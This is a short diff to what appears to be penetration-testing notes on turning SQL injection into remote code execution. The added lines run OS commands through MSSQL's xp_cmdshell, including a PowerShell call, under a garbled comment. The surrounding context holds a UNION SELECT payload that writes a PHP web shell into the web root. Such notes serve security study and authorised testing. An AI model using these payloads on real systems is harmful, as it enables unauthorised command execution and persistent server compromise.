@@ -1324,6 +1324,12 @@ RECONFIGURE;
 #Now we can run commands
 EXECUTE xp_cmdshell 'whoami';
 
+#After successfully partial command shell observe the commands with syntax both are same caution EXECUTE
+EXECUTE xp_cmdshell 'whoami';
+xp_cmdshell powershell -c ls;
+
+
+
 #Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
 #Now we can exploit it
